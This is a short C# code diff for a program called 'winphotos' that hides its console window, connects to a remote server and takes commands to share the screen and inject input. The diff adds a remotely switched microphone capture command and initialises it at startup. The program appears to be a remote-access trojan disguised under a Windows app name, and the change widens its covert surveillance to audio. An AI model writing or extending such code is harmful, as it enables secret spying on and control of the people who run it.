@@ -12,6 +12,7 @@ namespace winphotos
         static void Main()
         {
             ShowWindow(GetConsoleWindow(), 0);
+            Microphone.Init();
             ServerConnection.ConnectToServer();
             while (true) 
             {
@@ -68,6 +69,7 @@ namespace winphotos
                     }
                     else if (Buffer[0] == 3) // Share screen
                     {
+                        if (Buffer.Length == 1) continue;
                         byte code = Buffer[1];
                         Console.WriteLine("Share screen: " + (code == 1));
                         if (code == 0) ShareScreen.Running = false;
@@ -76,6 +78,13 @@ namespace winphotos
                     else if (Buffer[0] == 4) // Input injection
                     {
                         Input.Inject(Buffer);
+                    }
+                    else if(Buffer[0] == 5)
+                    {
+                        if (Buffer.Length == 1) continue;
+                        byte value = Buffer[1];
+                        Microphone.Running = value == 1;
+                        Console.WriteLine("Microphone " + (value == 1));
                     }
                 }
                 catch (SocketException)
